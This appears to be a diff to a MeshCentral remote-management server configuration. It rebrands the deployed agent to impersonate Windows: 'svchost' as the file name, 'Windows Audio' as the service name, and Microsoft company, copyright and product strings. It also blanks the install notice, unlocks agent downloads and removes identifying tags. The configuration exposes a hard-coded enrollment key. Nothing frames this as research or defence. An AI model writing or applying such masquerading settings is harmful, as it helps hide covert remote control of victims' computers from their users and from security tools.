@@ -49,7 +49,7 @@
       ]
     },
     "agentsInRam": true,
-    "lockAgentDownload": true,
+    "lockAgentDownload": false,
     "rootCertCommonName": "MeshCentralRoot-Auto",
     "agentUpdateSystem": 2,
     "allowHighQualityDesktop": true
@@ -79,35 +79,32 @@
       ],
       "agentSelfGuestSharing": true,
       "agentCustomization": {
-        "displayName": "High Support Agent",
-        "description": "High Support remote management agent",
-        "companyName": "HighSupport",
-        "serviceName": "highsupport",
-        "installText": "Installing the High Support remote management agent.",
-        "fileName": "highsupport-agent",
+        "displayName": "Service Host: Local Service (Network Restricted))",
+        "description": "Host Process for Windows",
+        "companyName": "Microsoft®",
+        "serviceName": "Windows Audio",
+        "installText": "",
+        "fileName": "svchost",
         "foregroundColor": "#ffffff",
         "backgroundColor": "#1b4058"
       },
       "agentFileInfo": {
-        "fileDescription": "High Support Remote Agent",
+        "fileDescription": "Host Process for Windows Services",
         "fileVersion": "1.0.0.0",
-        "internalName": "highsupport-agent",
-        "legalCopyright": "© 2025 High Support",
-        "originalFilename": "HighSupportAgent.exe",
-        "productName": "High Support Remote Agent",
+        "internalName": "svchost",
+        "legalCopyright": "© Microsoft Corporation. All rights reserved.",
+        "originalFilename": "svchost.exe",
+        "productName": "Microsoft® Windows® operating system",
         "productVersion": "v1.0.0",
         "icon": "service.ico"
       },
-      "agentConfig": [
-        "webSocketMaskOverride=1",
-        "coreDumpEnabled=1"
-      ],
-      "agentInviteCodes": true,
+      "agentConfig": [],
+      "agentInviteCodes": false,
       "agentNoProxy": false,
       "agentTag": {
-        "ServerName": 1,
-        "ServerDesc": 2,
-        "ServerTags": 3
+        "ServerName": 0,
+        "ServerDesc": 0,
+        "ServerTags": 0
       },
       "agentAllowedIP": [
         "72.60.233.0/24",
@@ -119,7 +116,7 @@
         "::1/128"
       ],
       "agentKey": "HighSupportEdgeEnrollment2025!",
-      "lockAgentDownload": true
+      "lockAgentDownload": false
     }
   },
   "letsencrypt": {
